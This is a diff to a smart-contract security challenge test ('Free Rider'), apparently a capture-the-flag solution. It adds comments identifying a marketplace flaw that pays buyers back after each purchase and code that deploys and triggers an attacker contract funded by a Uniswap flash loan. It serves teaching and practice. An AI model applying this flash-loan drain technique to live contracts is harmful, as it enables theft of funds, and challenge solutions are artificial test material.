@@ -105,7 +105,16 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // We can see that the NFTMarketPlace actually returns the payment after each purchase.
+        // However we don't have enough ether for initial purchase, luckily there is a uniswapv2
+        // for us to perform flashloans on.
+        const attacker = await (await ethers.getContractFactory('FreeRiderAttacker', player)).deploy(
+            marketplace.address,
+            devsContract.address,
+            uniswapPair.address,
+            {value: 1n * 10n ** 16n}
+        );
+        await attacker.attack();
     });
 
     after(async function () {
